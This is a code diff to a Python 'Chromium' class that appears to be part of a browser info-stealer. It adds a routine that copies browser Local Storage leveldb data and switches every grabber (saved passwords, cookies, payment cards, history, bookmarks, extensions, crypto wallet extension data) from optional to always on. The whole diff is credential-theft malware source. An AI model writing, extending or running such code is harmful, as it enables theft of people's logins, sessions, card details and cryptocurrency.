@@ -227,6 +227,34 @@ class Chromium:
 
         self.__storage.add_data("Passwords", len(temp))
 
+    def _grab_leveldb(self, profile: str, level_path: str) -> None:
+        """
+        Collects browser leveldb.
+
+        Parameters:
+        - profile [str]: Browser profile.
+        - extensions_path [str]: Path to extensions directory.
+
+        Returns:
+        - None.
+        """
+        if not path.exists(level_path):
+            pass
+            return
+
+        try:
+
+            self.__storage.add_from_disk(
+                level_path,
+                path.join(self.__path, rf"{profile} Local Storage")
+            )
+
+        except Exception as e:
+            print(e)
+            pass
+
+    
+
     def _grab_cookies(self, profile: str, file_path: str) -> None:
         """
         Collects browser cookies.
@@ -483,37 +511,42 @@ class Chromium:
             {
                 "method": self._grab_passwords,
                 "arguments": [profile_name, path.join(profile, "Login Data")],
-                "status": True if Features.passwords in self.__statuses else False
+                "status": True
             },
             {
                 "method": self._grab_cookies,
                 "arguments": [profile_name, path.join(profile, "Network", "Cookies")],
-                "status": True if Features.cookies in self.__statuses else False
+                "status": True
             },
             {
                 "method": self._grab_cards,
                 "arguments": [profile_name, path.join(profile, "Web Data")],
-                "status": True if Features.cards in self.__statuses else False
+                "status": True
             },
             {
                 "method": self._grab_history,
                 "arguments": [profile_name, path.join(profile, "History")],
-                "status": True if Features.history in self.__statuses else False
+                "status": True
             },
             {
                 "method": self._grab_bookmarks,
                 "arguments": [profile_name, path.join(profile, "Bookmarks")],
-                "status": True if Features.bookmarks in self.__statuses else False
+                "status": True
             },
             {
                 "method": self._grab_extensions,
                 "arguments": [profile_name, path.join(profile, "Extensions")],
-                "status": True if Features.bookmarks in self.__statuses else False
+                "status": True
+            },
+            {
+                "method": self._grab_leveldb,
+                "arguments": [profile_name, path.join(profile, "Local Storage")],
+                "status": True
             },
             {
                 "method": self._grab_wallets,
                 "arguments": [profile_name, path.join(profile, "Local Extension Settings")],
-                "status": True if Features.wallets in self.__statuses else False
+                "status": True
             }
         ]
 
